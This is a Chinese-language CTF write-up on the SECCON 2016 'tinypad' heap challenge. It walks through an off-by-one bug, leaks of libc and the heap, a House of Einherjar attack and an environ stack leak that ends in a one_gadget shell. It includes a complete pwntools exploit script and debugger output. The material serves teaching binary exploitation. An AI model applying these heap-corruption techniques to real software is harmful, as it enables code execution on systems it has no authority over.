href="#2016-Seccon-tinypad" class="headerlink" title="2016 Seccon tinypad"></a>2016 Seccon tinypad</h2><p>这道题说难不难。。我也做得久了，因为exp看不懂啊，这么复杂。。。后来简化了下，感觉轻松点了</p><a id="more"></a>


<p>功能分析，新增，删除，编辑，退出</p>
<p>至于洞，off-by-one</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_until</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">unsigned</span> __int64 len, <span class="keyword">unsigned</span> <span class="keyword">int</span> terminate)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = terminate;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = read_n(<span class="number">0L</span>L, &amp;a1[i], <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( !v6 || a1[i] == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  a1[i] = <span class="number">0</span>; #a1[i]可以是a1[len],多了一个字节</span><br><span class="line">  <span class="keyword">if</span> ( i == len &amp;&amp; a1[len - <span class="number">1</span>] != <span class="string">'\n'</span> )</span><br><span class="line">    dummyinput(v4);</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><h4 id="堆操作初始化部分"><a href="#堆操作初始化部分" class="headerlink" title="堆操作初始化部分"></a>堆操作初始化部分</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./tinypad'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./tinypad'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"(CMD)&gt;&gt;&gt; "</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"A"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(SIZE)&gt;&gt;&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="string">"D"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"E"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">"(Y/n)&gt;&gt;&gt; "</span>, <span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="string">"Q"</span>)</span><br></pre></td></tr></table></figure>


<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stage 1 leak the addr</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'1'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'2'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'3'</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>)</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">heap = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">io.success(<span class="string">"heap: 0x%x"</span> % heap)</span><br><span class="line">io.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">leak_libc = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">io.success(<span class="string">"main_arena: 0x%x"</span> %leak_libc)</span><br><span class="line">libc_base = leak_libc - <span class="number">0x3c4b20</span></span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>这个部分简单啊，leak，全在unsortedbin里，这里学到一个知识点是rstrip,通常我只用过strip，<br>该rstrip()方法删除所有尾随字符（字符串末尾的字符），空格是要删除的默认尾随字符<br>至于88这个是main_arena+88，减掉就是main_arena</p>
<h4 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'2'</span>*<span class="number">0xf8</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'3'</span>*<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">tinypad = <span class="number">0x0000000000602040</span></span><br><span class="line">offset = heap + <span class="number">0x20</span> - (<span class="number">0x602040</span> + <span class="number">0x20</span>)</span><br><span class="line">io.success(<span class="string">"offset: 0x%x"</span> % offset)</span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">remove(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(leak_libc + <span class="number">88</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>原解我感觉把题目搞复杂了，不需要for循环覆盖那个pre_size，完全可以利用add的时候加上就完了，<br>house of einherjar这个攻击方法有点类似于unlink，不过又不太相似</p>
<ol>
<li><p>目标:0x602060这个位置<br>heap + 0x20是第二个chunk位置<br>我们目的就是让第二个chunk的上一个chunk达到0x602060<br>所以pre_size就是第二个chunk位置减去0x602060<br>offset = heap + 0x20 - (0x602040 + 0x20)</p>
</li>
<li><p>fake_chunk这里是从tinypad开始地址开始覆盖的，前面0x20个作为后面填充部分，防止多次写的时候覆盖到<br>然后指针不像unlink那样了，<br>p-&gt;fd = p<br>p-&gt;bk = p</p>
</li>
<li><p>这里edit的时候都会从tinypad开始覆盖，所以编辑别个也可以的<br>edit(3, “4”*0x20 + fake_chunk)</p>
</li>
<li><p>remove(1)在add(0x18)，利用tcache的复用就行了，原exp的解是搞得很复杂，循环单字节null填充，太麻烦了感觉</p>
</li>
<li><p>这点不用这么复杂，0x101是为了后面分配用的，而p64(leak_libc+88)*2 这里，你只要bk是个可写的地址就行了，不要是不可写的就行，unsortedbin攻击里讲过</p>
</li>
</ol>
<p>引用ctf-wiki</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">#在 glibc/<span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks 3"</span>);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>


<p>edit(4, “4”<em>0x20 + p64(0) + p64(0x101) + p64(leak_libc + 88)</em>2)</p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stage 3</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line"></span><br><span class="line">io.success(<span class="string">"environ_pointer: 0x%x"</span> % environ_pointer)</span><br><span class="line">add(<span class="number">0xf0</span>, <span class="string">'1'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">main_ret = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">io.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line">edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">quit()</span><br></pre></td></tr></table></figure>

<p>这里学到了一个新方法，通过environ泄露main函数ret地址，然后覆盖main_ret</p>
<p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。从以下结果可知环境指针 environ 在栈空间的高地址处。因此，可通过 environ 指针泄露栈地址。<br><a href="http://0x4c43.cn/2018/1013/stack-overflow-smash-utilization/" target="_blank" rel="noopener">讲解这部分的文章</a></p>
<p>这里还用到个常用攻击方法，覆盖两个指针，一个用来控制另一个地址的，这个跟unlink那会学的攻击手法一样的，至于0x8*30,可以用查看内存中对比</p>
<p>自己调试的时候可以main函数尾部下个断，可以看到我这个结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Breakpoint 1, 0x0000000000400e68 <span class="keyword">in</span> main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x7f5fc76f6ae0 (_nl_C_LC_CTYPE_toupper) ◂— add    byte ptr [rax], 0</span><br><span class="line"> RDI  0x51</span><br><span class="line"> RSI  0x0</span><br><span class="line"> R8   0x1</span><br><span class="line"> R9   0x1999999999999999</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fff53d21f40 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x401370 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"> RIP  0x400e68 (main+1541) ◂— ret    </span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x400e68       &lt;main+1541&gt;                ret             &lt;0x7f5fc75a0830; __libc_start_main+240&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f5fc75a0830 &lt;__libc_start_main+240&gt;    mov    edi, eax</span><br><span class="line">   0x7f5fc75a0832 &lt;__libc_start_main+242&gt;    call   <span class="built_in">exit</span> &lt;0x7f5fc75ba030&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a0837 &lt;__libc_start_main+247&gt;    xor    edx, edx</span><br><span class="line">   0x7f5fc75a0839 &lt;__libc_start_main+249&gt;    jmp    __libc_start_main+57 &lt;0x7f5fc75a0779&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a083e &lt;__libc_start_main+254&gt;    mov    rax, qword ptr [rip + 0x3a8ecb] &lt;0x7f5fc7949710&gt;</span><br><span class="line">   0x7f5fc75a0845 &lt;__libc_start_main+261&gt;    ror    rax, 0x11</span><br><span class="line">   0x7f5fc75a0849 &lt;__libc_start_main+265&gt;    xor    rax, qword ptr fs:[0x30]</span><br><span class="line">   0x7f5fc75a0852 &lt;__libc_start_main+274&gt;    call   rax</span><br><span class="line"> </span><br><span class="line">   0x7f5fc75a0854 &lt;__libc_start_main+276&gt;    mov    rax, qword ptr [rip + 0x3a8ea5] &lt;0x7f5fc7949700&gt;</span><br><span class="line">   0x7f5fc75a085b &lt;__libc_start_main+283&gt;    ror    rax, 0x11</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">01:0008│      0x7fff53d21e70 ◂— 0x1</span><br><span class="line">02:0010│      0x7fff53d21e78 —▸ 0x7fff53d21f48 —▸ 0x7fff53d233b3 ◂— <span class="string">'./tinypad'</span></span><br><span class="line">03:0018│      0x7fff53d21e80 ◂— 0x1c7b6fca0</span><br><span class="line">04:0020│      0x7fff53d21e88 —▸ 0x400863 (main) ◂— push   rbp</span><br><span class="line">05:0028│      0x7fff53d21e90 ◂— 0x0</span><br><span class="line">06:0030│      0x7fff53d21e98 ◂— 0x63cd5245d4e10d9c</span><br><span class="line">07:0038│      0x7fff53d21ea0 —▸ 0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0           400e68 main+1541</span><br><span class="line">   f 1     7f5fc75a0830 __libc_start_main+24</span><br></pre></td></tr></table></figure>



<p>为什么是libc_start_main?建议看看第三篇讲的linux x86程序启动<br>给链接</p>
<p><a href="https://luomuxiaoxiao.com/?p=516" target="_blank" rel="noopener">linux_x86程序启动中文版</a><br><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">linux_x86程序启动英文版</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">84	../sysdeps/unix/syscall-template.S: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  0xfffffffffffffe00</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line"> RDX  0x1</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fff48b59964 ◂— 0x7b51190000000000</span><br><span class="line"> R8   0x1</span><br><span class="line"> R9   0x1999999999999999</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x4006e0 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fff48b59a80 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fff48b59900 —▸ 0x7fff48b59950 —▸ 0x7fff48b59970 —▸ 0x7fff48b599a0 —▸ 0x401370 (__libc_csu_init) ◂— ...</span><br><span class="line"> RSP  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line"> RIP  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x7f30af211260 &lt;__read_nocancel+7&gt;     cmp    rax, -0xfff</span><br><span class="line">   0x7f30af211266 &lt;__read_nocancel+13&gt;    jae    <span class="built_in">read</span>+73 &lt;0x7f30af211299&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f30af211299 &lt;<span class="built_in">read</span>+73&gt;               mov    rcx, qword ptr [rip + 0x2ccbd8]</span><br><span class="line">   0x7f30af2112a0 &lt;<span class="built_in">read</span>+80&gt;               neg    eax</span><br><span class="line">   0x7f30af2112a2 &lt;<span class="built_in">read</span>+82&gt;               mov    dword ptr fs:[rcx], eax</span><br><span class="line">   0x7f30af2112a5 &lt;<span class="built_in">read</span>+85&gt;               or     rax, 0xffffffffffffffff</span><br><span class="line">   0x7f30af2112a9 &lt;<span class="built_in">read</span>+89&gt;               ret    </span><br><span class="line"> </span><br><span class="line">   0x7f30af2112aa                         nop    word ptr [rax + rax]</span><br><span class="line">   0x7f30af2112b0 &lt;write&gt;                 cmp    dword ptr [rip + 0x2d2489], 0 &lt;0x7f30af4e3740&gt;</span><br><span class="line">   0x7f30af2112b7 &lt;write+7&gt;               jne    write+25 &lt;0x7f30af2112c9&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f30af2112c9 &lt;write+25&gt;              sub    rsp, 8</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">01:0008│      0x7fff48b598c0 —▸ 0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* <span class="string">'(CMD)&gt;&gt;&gt; '</span> */</span><br><span class="line">02:0010│      0x7fff48b598c8 ◂— 0x1</span><br><span class="line">03:0018│      0x7fff48b598d0 —▸ 0x7fff48b59964 ◂— 0x7b51190000000000</span><br><span class="line">04:0020│      0x7fff48b598d8 —▸ 0x400fad (_write_n+112) ◂— mov    qword ptr [rbp - 0x10], rax</span><br><span class="line">05:0028│      0x7fff48b598e0 —▸ 0x401a29 ◂— or     al, byte ptr [rax] /* <span class="string">'\n'</span> */</span><br><span class="line">06:0030│      0x7fff48b598e8 ◂— 0x0</span><br><span class="line">07:0038│      0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* <span class="string">'(CMD)&gt;&gt;&gt; '</span> */</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0     7f30af211260 __read_nocancel+7</span><br><span class="line">   f 1           400ed9 _read_n+112</span><br><span class="line">   f 2           401100 read_until+73</span><br><span class="line">   f 3           400832 getcmd+92</span><br><span class="line">   f 4           4009c1 main+350</span><br><span class="line">   f 5     7f30af13a830 __libc_start_main+240</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ find <span class="string">'0x7f30af13a830'</span></span><br><span class="line">Searching <span class="keyword">for</span> <span class="string">'0x7f30af13a830'</span> <span class="keyword">in</span>: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">[stack] : 0x7fff48b599a8 --&gt; 0x7f30af13a830 (&lt;__libc_start_main+240&gt;:	mov    edi,eax)</span><br><span class="line">gdb-peda$ p 0x7fff48b599a8-0x7fff48b59a98</span><br><span class="line"><span class="variable">$1</span> = 0xffffffffffffff10</span><br><span class="line">gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8</span><br><span class="line"><span class="variable">$2</span> = 0xf0</span><br></pre></td></tr></table></figure>

<p>这里说下怎么找偏移，<br>从environ里leak出来的地址[+] main_ret: 0x7fff48b59a98，在与find出来的地址，find  的话，是find上面的f5那个地址，就是查找存了这个地址的位置，然后计算下偏移就行了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8</span><br><span class="line"><span class="variable">$2</span> = 0xf0</span><br></pre></td></tr></table></figure>



<p>完结，撒花</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./tinypad'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">io = process(<span class="string">'./tinypad'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"(CMD)&gt;&gt;&gt; "</span>, idx)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"A"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(SIZE)&gt;&gt;&gt; "</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="string">"D"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="string">"E"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"(INDEX)&gt;&gt;&gt; "</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"(CONTENT)&gt;&gt;&gt; "</span>, content)</span><br><span class="line">    io.sendlineafter(<span class="string">"(Y/n)&gt;&gt;&gt; "</span>, <span class="string">"Y"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="string">"Q"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#stage 1 leak the addr</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'1'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'2'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'3'</span>*<span class="number">0x80</span>)</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'4'</span>*<span class="number">0x80</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"INDEX: 1\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    heap = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">    io.success(<span class="string">"heap: 0x%x"</span> % heap)</span><br><span class="line">    io.recvuntil(<span class="string">"INDEX: 3\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    leak_libc = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">    io.success(<span class="string">"main_arena: 0x%x"</span> %leak_libc)</span><br><span class="line">    libc_base = leak_libc - <span class="number">0x3c4b20</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">4</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#stage 2</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">'1'</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'2'</span>*<span class="number">0xf8</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'3'</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">0x100</span>, <span class="string">'4'</span>*<span class="number">0xf8</span>)</span><br><span class="line">    </span><br><span class="line">    tinypad = <span class="number">0x0000000000602040</span></span><br><span class="line">    offset = heap + <span class="number">0x20</span> - (<span class="number">0x602040</span> + <span class="number">0x20</span>)</span><br><span class="line">    io.success(<span class="string">"offset: 0x%x"</span> % offset)</span><br><span class="line">    fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(<span class="number">0x602060</span>)*<span class="number">2</span></span><br><span class="line">    edit(<span class="number">3</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + fake_chunk)</span><br><span class="line">    remove(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">'1'</span>*<span class="number">0x10</span> + p64(offset))</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">"4"</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(leak_libc + <span class="number">88</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#stage 3</span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    environ_pointer = libc_base + libc.symbols[<span class="string">'__environ'</span>]</span><br><span class="line"></span><br><span class="line">    io.success(<span class="string">"environ_pointer: 0x%x"</span> % environ_pointer)</span><br><span class="line">    add(<span class="number">0xf0</span>, <span class="string">'1'</span>*<span class="number">0xd0</span> + p64(<span class="number">0x18</span>) + p64(environ_pointer) + <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0x602148</span>))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">" #   INDEX: 1\n"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">" # CONTENT: "</span>)</span><br><span class="line">    main_ret = u64(io.recvline().rstrip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x8</span> * <span class="number">30</span></span><br><span class="line">    io.success(<span class="string">"main_ret: %x"</span> % main_ret)</span><br><span class="line">    edit(<span class="number">2</span>, p64(main_ret))</span><br><span class="line">    edit(<span class="number">1</span>, p64(one_gadget))</span><br><span class="line">    quit()</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="hitcontraning-lab11"><a href="#hitcontraning-lab11" class="headerlink" title="hitcontraning_lab11"></a>hitcontraning_lab11</h2><p>这题算是实验，所以直接调试exp，<br>运行环境： libc2.23.so </p>
<p>最新的libc2.29似乎加入了检查，运行exp报错</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><p>申请一个堆块状态，目的是覆盖top chunk</p>
